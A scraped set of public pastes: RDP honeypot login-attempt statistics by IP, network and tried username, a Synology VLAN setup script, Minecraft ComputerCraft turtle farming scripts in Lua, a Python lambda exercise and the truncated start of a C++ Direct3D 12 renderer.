    ""135.26.109.26"": 6,
    ""62.215.34.181"": 6,
    ""91.238.181.22"": 6,
    ""88.214.25.63"": 6,
    ""172.190.111.208"": 12,
    ""88.214.25.61"": 6,
    ""88.214.25.65"": 6,
    ""205.210.31.88"": 9,
    ""66.85.52.121"": 6,
    ""209.237.106.87"": 3,
    ""104.248.154.46"": 3,
    ""152.32.139.190"": 3,
    ""43.134.186.29"": 3,
    ""103.179.220.6"": 6,
    ""80.66.66.250"": 15,
    ""185.234.216.83"": 9,
    ""58.218.199.219"": 15,
    ""205.210.31.180"": 9,
    ""217.61.16.103"": 3,
    ""47.106.214.128"": 3,
    ""87.251.75.211"": 3,
    ""116.140.196.215"": 3,
    ""150.223.56.176"": 108,
    ""205.210.31.204"": 9,
    ""64.227.52.19"": 12,
    ""104.237.154.138"": 3
  },
  ""asn"": {
    ""AS201814"": 2439,
    ""AS14061"": 24,
    ""AS17621"": 6,
    ""AS208046"": 9,
    ""AS138107"": 3,
    ""AS212330"": 9,
    ""AS398705"": 3,
    ""AS396982"": 36,
    ""AS208312"": 21,
    ""AS398324"": 3,
    ""AS6300"": 6,
    ""AS21050"": 6,
    ""AS49434"": 6,
    ""AS29551"": 18,
    ""AS8075"": 12,
    ""AS62537"": 6,
    ""AS16904"": 3,
    ""AS135377"": 3,
    ""AS132203"": 3,
    ""AS149255"": 6,
    ""AS51765"": 15,
    ""AS57523"": 9,
    ""AS4134"": 15,
    ""AS199883"": 3,
    ""AS37963"": 3,
    ""AS208091"": 3,
    ""AS4837"": 3,
    ""AS58519"": 108,
    ""AS63949"": 3
  },
  ""isp"": {
    ""MEVSPACE sp. z o.o."": 2439,
    ""DigitalOcean, LLC"": 24,
    ""China Unicom Shanghai Province Network"": 6,
    ""ColocationX Ltd."": 9,
    ""PT Virtual Data Centra Indonesia"": 3,
    ""Civilisation Information Technology"": 9,
    ""Censys, Inc."": 6,
    ""Google LLC"": 36,
    ""Red Byte LLC"": 21,
    ""Consolidated Communications, Inc."": 6,
    ""Fast Telecommunications Company W.L.L."": 6,
    ""Datacenter location PAR1 France"": 6,
    ""NOC EMAIL: noc@one-host.net"": 18,
    ""Microsoft"": 12,
    ""Sauce Labs Inc"": 6,
    ""Arvig Enterprises Inc."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Aceville Pte.ltd"": 3,
    ""Bhavya Net"": 6,
    ""Oy Crea Nova Hosting Solution Ltd"": 15,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Chinanet"": 15,
    ""ArubaCloud UK Network"": 3,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""Xhost Internet Solutions LP"": 3,
    ""China Unicom CHINA169 Network"": 3,
    ""Cloud Computing Corporation"": 108,
    ""Akamai Technologies, Inc."": 3
  },
  ""org"": {
    ""HostSlick"": 2439,
    ""DigitalOcean, LLC"": 24,
    ""Unknown"": 9,
    ""Makut Investments"": 9,
    ""PT Virtual Data Centra Indonesia"": 3,
    ""Civilisation Information Technology, communication and internet services Co., LTD"": 9,
    ""Censys, Inc."": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Chang Way Technologies Co. Limited"": 30,
    ""Censys, Inc"": 3,
    ""Consolidated Communications, Inc."": 6,
    ""Fasttelco"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 24,
    ""Microsoft Azure Cloud (eastus)"": 12,
    ""Sauce Labs Inc"": 6,
    ""Arvig Enterprises Inc"": 3,
    ""Ucloud Information Technology"": 3,
    ""Bhavya"": 6,
    ""Xhost Internet Solutions"": 18,
    ""Chinanet JS"": 15,
    ""Aruba S.p.A. - CLoud Services"": 3,
    ""Aliyun Computing Co., LTD"": 3,
    ""China United Network Communications Corporation Limited"": 3,
    ""Chinanet SD"": 108,
    ""Linode"": 3
  },
  ""regionName"": {
    ""Virginia"": 2460,
    ""California"": 66,
    ""Shanghai"": 6,
    ""Jakarta"": 3,
    ""Baghdad"": 9,
    ""Michigan"": 6,
    ""Moscow"": 30,
    ""Texas"": 6,
    ""Hawalli"": 6,
    ""\u00cele-de-France"": 6,
    ""Hesse"": 18,
    ""Minnesota"": 3,
    ""Central Singapore"": 3,
    ""Seoul"": 3,
    ""North West"": 3,
    ""Gujarat"": 6,
    ""Uusimaa"": 15,
    ""Jiangsu"": 15,
    ""England"": 3,
    ""Guangdong"": 3,
    ""North Holland"": 3,
    ""Beijing"": 3,
    ""Shandong"": 108
  },
  ""country"": {
    ""United States"": 2541,
    ""China"": 135,
    ""Indonesia"": 3,
    ""Iraq"": 9,
    ""Russia"": 30,
    ""Kuwait"": 6,
    ""France"": 6,
    ""Germany"": 18,
    ""Singapore"": 6,
    ""South Korea"": 3,
    ""India"": 6,
    ""Finland"": 15,
    ""United Kingdom"": 3,
    ""The Netherlands"": 3
  },
  ""account"": {
    ""hello"": 2511,
    ""(empty)"": 15,
    ""Domain"": 21,
    ""Almaz"": 3,
    ""LwABWeqUj"": 3,
    ""iLKzdb"": 3,
    ""WDdicj"": 3,
    ""Test"": 54,
    ""gsVWIaVjr"": 3,
    ""qttvqw"": 3,
    ""aUBNSr"": 3,
    ""Administrator"": 30,
    ""Administr"": 18,
    ""vYRapnMsx"": 3,
    ""HxwQkk"": 3,
    ""NrUbDL"": 3,
    ""Admin"": 27,
    ""Whatuptime.com"": 27,
    ""Jakartakini123#"": 27,
    ""pXMicPwqP"": 3,
    ""VeVNxA"": 3,
    ""DvqBRC"": 3,
    ""choshfas"": 12,
    ""beio"": 3
  },
  ""keyboard"": {
    ""Unknown"": 2784
  },
  ""client_build"": {
    ""Unknown"": 2784
  },
  ""client_name"": {
    ""Unknown"": 2784
  },
  ""ip_type"": {
    ""Unknown"": 2520,
    ""hosting"": 231,
    ""proxy"": 30,
    ""hosting & proxy"": 3
  }
}"
864qFxnV,2024-07-05_stats.json,rdp_snitch,JSON,Friday 5th of July 2024 07:16:05 PM CDT,"{
  ""ip"": {
    ""194.180.49.43"": 1626,
    ""164.92.104.215"": 6,
    ""223.166.31.100"": 4,
    ""185.196.220.41"": 6,
    ""103.126.57.31"": 2,
    ""185.113.106.68"": 6,
    ""167.94.145.104"": 2,
    ""147.185.132.165"": 6,
    ""213.109.202.252"": 14,
    ""167.94.138.57"": 2,
    ""135.26.109.26"": 4,
    ""62.215.34.181"": 4,
    ""91.238.181.22"": 4,
    ""88.214.25.63"": 4,
    ""172.190.111.208"": 8,
    ""88.214.25.61"": 4,
    ""88.214.25.65"": 4,
    ""205.210.31.88"": 6,
    ""66.85.52.121"": 4,
    ""209.237.106.87"": 2,
    ""104.248.154.46"": 2,
    ""152.32.139.190"": 2,
    ""43.134.186.29"": 2,
    ""103.179.220.6"": 4,
    ""80.66.66.250"": 10,
    ""185.234.216.83"": 6,
    ""58.218.199.219"": 10,
    ""205.210.31.180"": 6,
    ""217.61.16.103"": 2,
    ""47.106.214.128"": 2,
    ""87.251.75.211"": 2,
    ""116.140.196.215"": 2,
    ""150.223.56.176"": 72,
    ""205.210.31.204"": 6,
    ""64.227.52.19"": 8,
    ""104.237.154.138"": 2
  },
  ""asn"": {
    ""AS201814"": 1626,
    ""AS14061"": 16,
    ""AS17621"": 4,
    ""AS208046"": 6,
    ""AS138107"": 2,
    ""AS212330"": 6,
    ""AS398705"": 2,
    ""AS396982"": 24,
    ""AS208312"": 14,
    ""AS398324"": 2,
    ""AS6300"": 4,
    ""AS21050"": 4,
    ""AS49434"": 4,
    ""AS29551"": 12,
    ""AS8075"": 8,
    ""AS62537"": 4,
    ""AS16904"": 2,
    ""AS135377"": 2,
    ""AS132203"": 2,
    ""AS149255"": 4,
    ""AS51765"": 10,
    ""AS57523"": 6,
    ""AS4134"": 10,
    ""AS199883"": 2,
    ""AS37963"": 2,
    ""AS208091"": 2,
    ""AS4837"": 2,
    ""AS58519"": 72,
    ""AS63949"": 2
  },
  ""isp"": {
    ""MEVSPACE sp. z o.o."": 1626,
    ""DigitalOcean, LLC"": 16,
    ""China Unicom Shanghai Province Network"": 4,
    ""ColocationX Ltd."": 6,
    ""PT Virtual Data Centra Indonesia"": 2,
    ""Civilisation Information Technology"": 6,
    ""Censys, Inc."": 4,
    ""Google LLC"": 24,
    ""Red Byte LLC"": 14,
    ""Consolidated Communications, Inc."": 4,
    ""Fast Telecommunications Company W.L.L."": 4,
    ""Datacenter location PAR1 France"": 4,
    ""NOC EMAIL: noc@one-host.net"": 12,
    ""Microsoft"": 8,
    ""Sauce Labs Inc"": 4,
    ""Arvig Enterprises Inc."": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Aceville Pte.ltd"": 2,
    ""Bhavya Net"": 4,
    ""Oy Crea Nova Hosting Solution Ltd"": 10,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Chinanet"": 10,
    ""ArubaCloud UK Network"": 2,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""Xhost Internet Solutions LP"": 2,
    ""China Unicom CHINA169 Network"": 2,
    ""Cloud Computing Corporation"": 72,
    ""Akamai Technologies, Inc."": 2
  },
  ""org"": {
    ""HostSlick"": 1626,
    ""DigitalOcean, LLC"": 16,
    ""Unknown"": 6,
    ""Makut Investments"": 6,
    ""PT Virtual Data Centra Indonesia"": 2,
    ""Civilisation Information Technology, communication and internet services Co., LTD"": 6,
    ""Censys, Inc."": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Chang Way Technologies Co. Limited"": 20,
    ""Censys, Inc"": 2,
    ""Consolidated Communications, Inc."": 4,
    ""Fasttelco"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 16,
    ""Microsoft Azure Cloud (eastus)"": 8,
    ""Sauce Labs Inc"": 4,
    ""Arvig Enterprises Inc"": 2,
    ""Ucloud Information Technology"": 2,
    ""Bhavya"": 4,
    ""Xhost Internet Solutions"": 12,
    ""Chinanet JS"": 10,
    ""Aruba S.p.A. - CLoud Services"": 2,
    ""Aliyun Computing Co., LTD"": 2,
    ""China United Network Communications Corporation Limited"": 2,
    ""Chinanet SD"": 72,
    ""Linode"": 2
  },
  ""regionName"": {
    ""Virginia"": 1640,
    ""California"": 44,
    ""Shanghai"": 4,
    ""Jakarta"": 2,
    ""Baghdad"": 6,
    ""Michigan"": 4,
    ""Moscow"": 20,
    ""Texas"": 4,
    ""Hawalli"": 4,
    ""\u00cele-de-France"": 4,
    ""Hesse"": 12,
    ""Minnesota"": 2,
    ""Central Singapore"": 2,
    ""Seoul"": 2,
    ""North West"": 2,
    ""Gujarat"": 4,
    ""Uusimaa"": 10,
    ""Jiangsu"": 10,
    ""England"": 2,
    ""Guangdong"": 2,
    ""North Holland"": 2,
    ""Beijing"": 2,
    ""Shandong"": 72
  },
  ""country"": {
    ""United States"": 1694,
    ""China"": 90,
    ""Indonesia"": 2,
    ""Iraq"": 6,
    ""Russia"": 20,
    ""Kuwait"": 4,
    ""France"": 4,
    ""Germany"": 12,
    ""Singapore"": 4,
    ""South Korea"": 2,
    ""India"": 4,
    ""Finland"": 10,
    ""United Kingdom"": 2,
    ""The Netherlands"": 2
  },
  ""account"": {
    ""hello"": 1674,
    ""(empty)"": 10,
    ""Domain"": 14,
    ""Almaz"": 2,
    ""LwABWeqUj"": 2,
    ""iLKzdb"": 2,
    ""WDdicj"": 2,
    ""Test"": 36,
    ""gsVWIaVjr"": 2,
    ""qttvqw"": 2,
    ""aUBNSr"": 2,
    ""Administrator"": 20,
    ""Administr"": 12,
    ""vYRapnMsx"": 2,
    ""HxwQkk"": 2,
    ""NrUbDL"": 2,
    ""Admin"": 18,
    ""Whatuptime.com"": 18,
    ""Jakartakini123#"": 18,
    ""pXMicPwqP"": 2,
    ""VeVNxA"": 2,
    ""DvqBRC"": 2,
    ""choshfas"": 8,
    ""beio"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1856
  },
  ""client_build"": {
    ""Unknown"": 1856
  },
  ""client_name"": {
    ""Unknown"": 1856
  },
  ""ip_type"": {
    ""Unknown"": 1680,
    ""hosting"": 154,
    ""proxy"": 20,
    ""hosting & proxy"": 2
  }
}"
ryhbSt6L,2024-07-05_stats.json,rdp_snitch,JSON,Friday 5th of July 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""194.180.49.43"": 813,
    ""164.92.104.215"": 3,
    ""223.166.31.100"": 2,
    ""185.196.220.41"": 3,
    ""103.126.57.31"": 1,
    ""185.113.106.68"": 3,
    ""167.94.145.104"": 1,
    ""147.185.132.165"": 3,
    ""213.109.202.252"": 7,
    ""167.94.138.57"": 1,
    ""135.26.109.26"": 2,
    ""62.215.34.181"": 2,
    ""91.238.181.22"": 2,
    ""88.214.25.63"": 2,
    ""172.190.111.208"": 4,
    ""88.214.25.61"": 2,
    ""88.214.25.65"": 2,
    ""205.210.31.88"": 3,
    ""66.85.52.121"": 2,
    ""209.237.106.87"": 1,
    ""104.248.154.46"": 1,
    ""152.32.139.190"": 1,
    ""43.134.186.29"": 1,
    ""103.179.220.6"": 2,
    ""80.66.66.250"": 5,
    ""185.234.216.83"": 3,
    ""58.218.199.219"": 5,
    ""205.210.31.180"": 3,
    ""217.61.16.103"": 1,
    ""47.106.214.128"": 1,
    ""87.251.75.211"": 1,
    ""116.140.196.215"": 1,
    ""150.223.56.176"": 36,
    ""205.210.31.204"": 3,
    ""64.227.52.19"": 4,
    ""104.237.154.138"": 1
  },
  ""asn"": {
    ""AS201814"": 813,
    ""AS14061"": 8,
    ""AS17621"": 2,
    ""AS208046"": 3,
    ""AS138107"": 1,
    ""AS212330"": 3,
    ""AS398705"": 1,
    ""AS396982"": 12,
    ""AS208312"": 7,
    ""AS398324"": 1,
    ""AS6300"": 2,
    ""AS21050"": 2,
    ""AS49434"": 2,
    ""AS29551"": 6,
    ""AS8075"": 4,
    ""AS62537"": 2,
    ""AS16904"": 1,
    ""AS135377"": 1,
    ""AS132203"": 1,
    ""AS149255"": 2,
    ""AS51765"": 5,
    ""AS57523"": 3,
    ""AS4134"": 5,
    ""AS199883"": 1,
    ""AS37963"": 1,
    ""AS208091"": 1,
    ""AS4837"": 1,
    ""AS58519"": 36,
    ""AS63949"": 1
  },
  ""isp"": {
    ""MEVSPACE sp. z o.o."": 813,
    ""DigitalOcean, LLC"": 8,
    ""China Unicom Shanghai Province Network"": 2,
    ""ColocationX Ltd."": 3,
    ""PT Virtual Data Centra Indonesia"": 1,
    ""Civilisation Information Technology"": 3,
    ""Censys, Inc."": 2,
    ""Google LLC"": 12,
    ""Red Byte LLC"": 7,
    ""Consolidated Communications, Inc."": 2,
    ""Fast Telecommunications Company W.L.L."": 2,
    ""Datacenter location PAR1 France"": 2,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Microsoft"": 4,
    ""Sauce Labs Inc"": 2,
    ""Arvig Enterprises Inc."": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Aceville Pte.ltd"": 1,
    ""Bhavya Net"": 2,
    ""Oy Crea Nova Hosting Solution Ltd"": 5,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Chinanet"": 5,
    ""ArubaCloud UK Network"": 1,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""Xhost Internet Solutions LP"": 1,
    ""China Unicom CHINA169 Network"": 1,
    ""Cloud Computing Corporation"": 36,
    ""Akamai Technologies, Inc."": 1
  },
  ""org"": {
    ""HostSlick"": 813,
    ""DigitalOcean, LLC"": 8,
    ""Unknown"": 3,
    ""Makut Investments"": 3,
    ""PT Virtual Data Centra Indonesia"": 1,
    ""Civilisation Information Technology, communication and internet services Co., LTD"": 3,
    ""Censys, Inc."": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Chang Way Technologies Co. Limited"": 10,
    ""Censys, Inc"": 1,
    ""Consolidated Communications, Inc."": 2,
    ""Fasttelco"": 2,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""Microsoft Azure Cloud (eastus)"": 4,
    ""Sauce Labs Inc"": 2,
    ""Arvig Enterprises Inc"": 1,
    ""Ucloud Information Technology"": 1,
    ""Bhavya"": 2,
    ""Xhost Internet Solutions"": 6,
    ""Chinanet JS"": 5,
    ""Aruba S.p.A. - CLoud Services"": 1,
    ""Aliyun Computing Co., LTD"": 1,
    ""China United Network Communications Corporation Limited"": 1,
    ""Chinanet SD"": 36,
    ""Linode"": 1
  },
  ""regionName"": {
    ""Virginia"": 820,
    ""California"": 22,
    ""Shanghai"": 2,
    ""Jakarta"": 1,
    ""Baghdad"": 3,
    ""Michigan"": 2,
    ""Moscow"": 10,
    ""Texas"": 2,
    ""Hawalli"": 2,
    ""\u00cele-de-France"": 2,
    ""Hesse"": 6,
    ""Minnesota"": 1,
    ""Central Singapore"": 1,
    ""Seoul"": 1,
    ""North West"": 1,
    ""Gujarat"": 2,
    ""Uusimaa"": 5,
    ""Jiangsu"": 5,
    ""England"": 1,
    ""Guangdong"": 1,
    ""North Holland"": 1,
    ""Beijing"": 1,
    ""Shandong"": 36
  },
  ""country"": {
    ""United States"": 847,
    ""China"": 45,
    ""Indonesia"": 1,
    ""Iraq"": 3,
    ""Russia"": 10,
    ""Kuwait"": 2,
    ""France"": 2,
    ""Germany"": 6,
    ""Singapore"": 2,
    ""South Korea"": 1,
    ""India"": 2,
    ""Finland"": 5,
    ""United Kingdom"": 1,
    ""The Netherlands"": 1
  },
  ""account"": {
    ""hello"": 837,
    ""(empty)"": 5,
    ""Domain"": 7,
    ""Almaz"": 1,
    ""LwABWeqUj"": 1,
    ""iLKzdb"": 1,
    ""WDdicj"": 1,
    ""Test"": 18,
    ""gsVWIaVjr"": 1,
    ""qttvqw"": 1,
    ""aUBNSr"": 1,
    ""Administrator"": 10,
    ""Administr"": 6,
    ""vYRapnMsx"": 1,
    ""HxwQkk"": 1,
    ""NrUbDL"": 1,
    ""Admin"": 9,
    ""Whatuptime.com"": 9,
    ""Jakartakini123#"": 9,
    ""pXMicPwqP"": 1,
    ""VeVNxA"": 1,
    ""DvqBRC"": 1,
    ""choshfas"": 4,
    ""beio"": 1
  },
  ""keyboard"": {
    ""Unknown"": 928
  },
  ""client_build"": {
    ""Unknown"": 928
  },
  ""client_name"": {
    ""Unknown"": 928
  },
  ""ip_type"": {
    ""Unknown"": 840,
    ""hosting"": 77,
    ""proxy"": 10,
    ""hosting & proxy"": 1
  }
}"
xZq9vBji,Pastebin.ai - #1 Pastebin Alternative,xxsa,PHP,Friday 5th of July 2024 07:12:29 PM CDT,"https://pastebin.ai - #1 Pastebin Alternative

its free and always will be.

pastebin.ai  is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Support Markdown & 150+ different syntax languages - All Free
Link redirect 
Simple Ads by Google Adsense Few rather than Pastebin
Paste Folders
Load files feature
Password protected pastes.
Encrypted pastes.
URL Shortener.
Unlisted pastes.
Private pastes.
Embed, download, print pastes.
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes.
Trending pastes page (day, week, month, year).
No Captcha for logged in users feature.
.....
......................................
.........."
ckUKCraa,vlan Skript,TDCroPower,Bash,Friday 5th of July 2024 07:01:01 PM CDT,"#!/bin/sh
# Set up a VLAN interface on an existing Synology network interface
#
# Copyright (c) 2023 Navigio UG (haftungsbeschr√§nkt)
# This software is provided 'as-is', without any express or implied warranty. 
# In no event will the authors be held liable for any damages arising from the use of this software.
#
# Permission is granted to anyone to use this software for any purpose, including 
# commercial applications, and to alter it and redistribute it freely.
#
# On Host this file needs to be placed into
# /usr/local/etc/rc.d
# insmod /lib/modules/8021q.ko

##### KONFIGURATION #####
# Insert your changes here...
EthernetInterface=""eth0""
BridgeInterface=""mvlbr""
VlanID=""200""
HostIP=""192.168.200.2/24""
BroadcastIP=""192.168.200.255""
ContainerAccessIP=""192.168.200.254/32""
ContainerNetwork=""192.168.200.0/24""
##### KONFIGURATION #####

#### DON'T TOUCH HERE ANYTHING ####### 
# First delete possibly existing VLAN interfaces
ip link del ${BridgeInterface}.${VlanID}
ip link del ${EthernetInterface}.${VlanID}

# Set up networking interface on VLAN ID
# Prerequisite: VLAN has to be set up on router or L3 switch
ip link add link ${EthernetInterface} name ${EthernetInterface}.${VlanID} type vlan id ${VlanID}
ip addr add ${HostIP} brd ${BroadcastIP} dev ${EthernetInterface}.${VlanID}
ip link set dev ${EthernetInterface}.${VlanID} up

# macvlan bridge for communication between host & containers
ip link add ${BridgeInterface}.${VlanID} link ${EthernetInterface}.${VlanID} type macvlan mode bridge
ip addr add ${ContainerAccessIP} dev ${BridgeInterface}.${VlanID}
ip link set ${BridgeInterface}.${VlanID} up
ip route del ${ContainerNetwork}
ip route add ${ContainerNetwork} dev ${BridgeInterface}.${VlanID}
#### DON'T TOUCH HERE ANYTHING #######"
CAm1JKgh,TurtlePostionAPI,PrivateAgentZero,Lua,Friday 5th of July 2024 05:15:15 PM CDT,"local turtlePos = {

}
-- Veritcal Axis = Y

turtlePos.position = {
    x = 0,
    y = 0,
    z = 0,
}


turtlePos.direction = {
    postive_x = 0,
    negative_x = 1,
    postive_z = 2,
    negative_z = 3,
}

turtlePos.turnDirection = {
    left = 0,
    right = 1,
}

turtlePos.facingDirection = turtlePos.direction.postive_x

local function nextState(previous_state, turnDirection)

    local high_bit = bit.blogic_rshift(previous_state,1) 
    local low_bit = bit.band(previous_state,1)

    local nextState = bit.blshift(bit.bxor(high_bit,1),1) + bit.bxor(bit.bxor(bit.bxor(high_bit,low_bit),turnDirection),1)
    return nextState
end

turtlePos.getPosition = function ()
    return turtlePos.position[""x""], turtlePos.position[""y""], turtlePos.position[""z""]
end

turtlePos.turnLeft = function ()
    turtle.turnLeft()
    turtlePos.facingDirection = nextState(turtlePos.facingDirection,turtlePos.turnDirection.left)
end

turtlePos.turnRight = function ()
    turtle.turnRight()
    turtlePos.facingDirection = nextState(turtlePos.facingDirection,turtlePos.turnDirection.right)
end

turtlePos.getFacingDirection = function ()
    return turtlePos.facingDirection
end

turtlePos.forward = function ()
    local moved = turtle.forward() 

    if moved then
        if turtlePos.facingDirection == turtlePos.direction.postive_x then
            turtlePos.position.x = turtlePos.position.x + 1
        end
        if turtlePos.facingDirection == turtlePos.direction.negative_x then
            turtlePos.position.x = turtlePos.position.x - 1
        end
        if turtlePos.facingDirection == turtlePos.direction.postive_z then
            turtlePos.position.z = turtlePos.position.z + 1
        end
        if turtlePos.facingDirection == turtlePos.direction.negative_z then
            turtlePos.position.z = turtlePos.position.z - 1
        end
    end
    
    return moved

end

turtlePos.back = function ()
    local moved = turtle.back() 

    if moved then
        if turtlePos.facingDirection == turtlePos.direction.postive_x then
            turtlePos.position.x = turtlePos.position.x - 1
        end
        if turtlePos.facingDirection == turtlePos.direction.negative_x then
            turtlePos.position.x = turtlePos.position.x + 1
        end
        if turtlePos.facingDirection == turtlePos.direction.postive_z then
            turtlePos.position.z = turtlePos.position.z - 1
        end
        if turtlePos.facingDirection == turtlePos.direction.negative_z then
            turtlePos.position.z = turtlePos.position.z + 1
        end
    end

    return moved
end

turtlePos.up = function ()
    local moved = turtle.up()
    if moved  then
        turtlePos.position.y = turtlePos.position.y + 1
    end
    return moved
end

turtlePos.down = function ()
    local moved = turtle.down()
    if moved  then
        turtlePos.position.y = turtlePos.position.y - 1
    end
    return moved
end

turtlePos.returnToZero = function ()
    local delta_x = turtlePos.position.x;
    local delta_z = turtlePos.position.z;

    if turtlePos.facingDirection == turtlePos.direction.postive_x then
        if delta_x < 0 then
            for _=1,delta_x do
                turtlePos.forward()
            end
        else
            for _=1,delta_x do
                turtlePos.back()
            end
        end
        turtlePos.turnRight()
        if delta_z < 0 then
            for _=1,delta_z do
                turtlePos.forward()
            end
        else
            for _=1,delta_z do
                turtlePos.back()
            end
        end
        turtlePos.turnLeft()
    elseif turtlePos.facingDirection == turtlePos.direction.negative_x then
        if delta_x > 0 then
            for _=1,delta_x do
                turtlePos.forward()
            end
        else
            for _=1,delta_x do
                turtlePos.back()
            end
        end
        turtlePos.turnLeft()
        if delta_z < 0 then
            for _=1,delta_z do
                turtlePos.forward()
            end
        else
            for _=1,delta_z do
                turtlePos.back()
            end
        end
        turtlePos.turnLeft()
    elseif turtlePos.facingDirection == turtlePos.direction.postive_z then
        if delta_z < 0 then
            for _=1,delta_z do
                turtlePos.forward()
            end
        else
            for _=1,delta_z do
                turtlePos.back()
            end
        end        
        turtlePos.turnLeft()
        if delta_x < 0 then
            for _=1,delta_x do
                turtlePos.forward()
            end
        else
            for _=1,delta_x do
                turtlePos.back()
            end
        end
        turtlePos.turnLeft()
    elseif turtlePos.facingDirection == turtlePos.direction.negative_z then
        if delta_z > 0 then
            for _=1,delta_z do
                turtlePos.forward()
            end
        else
            for _=1,delta_z do
                turtlePos.back()
            end
        end        
        turtlePos.turnRight()
        if delta_x < 0 then
            for _=1,delta_x do
                turtlePos.forward()
            end
        else
            for _=1,delta_x do
                turtlePos.back()
            end
        end
        turtlePos.turnLeft()
    end
end

return turtlePos"
yHQRvrt7,TurtleSquareFarm,PrivateAgentZero,Lua,Friday 5th of July 2024 05:14:01 PM CDT,"local FARM_SIZE = 7
local MIN_STAGE = 0
local MAX_STAGE = 7

local crop_seed_id = ""mysticalagriculture:inferium_seeds""
-- local crop_seed_id = ""minecraft:wheat_seeds""

local turtlePos = require(""turtlePos"")

turtle.select(1)

local function replantGrownCrop(data)
    local growth_stage = data[""state""][""age""]

    if growth_stage == MAX_STAGE then
        turtle.digDown()

        ::recheck::
        if not (turtle.getItemDetail()[""name""] == crop_seed_id) then
            turtle.transferTo(16)
            turtle.select(2)
            goto recheck
        end
        turtle.transferTo(1)
        turtle.select(1)
        turtle.placeDown()
    end
end



local direction = {}
direction.x = 1
direction.y = 2

local current_direction = direction.y;
while true do
    local current_x = 1;
    local current_y = 1;
    local n = 1;
    local distance = 1;
    
    -- TODO: REFUELING LOGIC 
    while turtle.getFuelLevel() < FARM_SIZE*FARM_SIZE+20 do
        turtle.suckUp()
        turtle.refuel()
        turtle.dropUp()
    end
    -- ITEM DROP OFF

    for i=1,16 do
        turtle.select(i)
        turtle.dropDown()
    end
    turtle.select(1)

    while(n < FARM_SIZE*FARM_SIZE) do
        turtlePos.forward()
        local is_block, data = turtle.inspectDown()
    
        if not is_block then
            goto continue
        end
        
        replantGrownCrop(data)
        
        ::continue::
        local distance_shift = math.floor(distance/4)
        
        if current_y == (FARM_SIZE - distance_shift) then
            turtlePos.turnRight()
            distance = distance + 1;
            current_direction = direction.x
            current_y = 1+distance_shift;
        end
    
        if current_x == (FARM_SIZE - distance_shift)  then
            turtlePos.turnRight()
            distance = distance + 1;
            current_direction = direction.y
            current_x = 1+distance_shift;
        end
    
        if current_direction == direction.y then
            current_y = current_y + 1;
        elseif current_direction == direction.x then
            current_x = current_x + 1;
        end
        n = n + 1
    end
    turtlePos.returnToZero()
end




-- for k, v in pairs(data[""state""]) do
--     -- print(k, v)
-- end

::exit::
"
NY7Ar7RL,potatoFarmer,BenDipp,Lua,Friday 5th of July 2024 04:33:43 PM CDT,"while true do
    local isThere, infos = turtle.inspect()
    if infos.state.age == 7 then
        turtle.dig()
        turtle.place()

        turtle.turnRight()
        turtle.turnRight()

        turtle.select(2)
        turtle.drop()
        turtle.select(1)

        turtle.turnRight()
        turtle.turnRight()
    end
    sleep(10)
end"
Tmg7u9uv,lambda,koulin,Python,Friday 5th of July 2024 04:07:19 PM CDT,"# task 2 
def cube(array):
    return list(map(lambda x : x ** 3, array))

# task 3
def low(array):
    return list(filter(lambda x : x < 0, array))

# task 4
from functools import reduce

def factorial(x):
    return reduce((lambda x,y : x * y), [i for i in range(1, x + 1)])

# task 5 
def mx(array):
    L = list(filter(lambda x :(x ** 2) % 9 == 0, array))
    answer = reduce(lambda a , b: a if a > b else b, L)
    return answer
"
SPuGMFVN,Renderer.cpp,Zgragselus,C++,Friday 5th of July 2024 03:48:41 PM CDT,"///////////////////////////////////////////////////////////////////////////////////////////////////
//
// Renderer.cpp
// 
///////////////////////////////////////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////////////////////////////////////////
// Header section

#include ""Game/Loader/Assimp.h""
#include ""Renderer.h""
#include <Graphics/System/MaterialSystem.h>

///////////////////////////////////////////////////////////////////////////////////////////////////
// Declaration section

///////////////////////////////////////////////////////////////////////////////////////////////////
// Definition section

/// <summary>
/// Parametric constructor.
/// 
/// Builds renderer and sets everything up.
/// </summary>
/// <param name=""engine"">Pointer to Engine instance</param>
/// <param name=""eventSystem"">Pointer to event system instance</param>
/// <param name=""options"">Pointer to configuration instance</param>
/// <param name=""log"">Pointer to logging system</param>
/// <param name=""renderer"">Pointer to Direct3D 12 renderer</param>
/// <param name=""swapChain"">Pointer to Swap chain for window</param>
/// <param name=""appState"">Pointer to Scmdl class instance (holding state/values for application)</param>
Renderer::Renderer(Engine::Core* engine, Engine::EventSystem* eventSystem, Engine::Constants* options, Engine::Log* log, Engine::D3DRenderer* renderer, Engine::D3DSwapChain* swapChain, Application* appState) :
	Engine::System(""Renderer"", eventSystem),
	mOptions(options),
	mLog(log),
	mRenderer(renderer),
	mSwapChain(swapChain),
	mAppState(appState)
{
	// Run in background
	EnableUpdater(Engine::Task::BACKGROUND_SYNC_REPEATING);

	// Create compute/render pipeline
	mPipeline = new Engine::ComputeGraph(engine);

	// Get whether to use HW ray tracing
	mUseHardwareRaytracing = options->Get<int>(""Renderer.RayTracing.Hardware"") == 0 ? false : true;		
	if (mUseHardwareRaytracing)
	{
		// Hardware ray tracer
		mRaytraceHWNode = new Engine::ComputeGraphNode(""Renderer::DXRPass"", eventSystem, [&]() -> void
			{
				Engine::GraphicsContext* context = mRenderer->GetGraphicsContext();

				context->Begin();

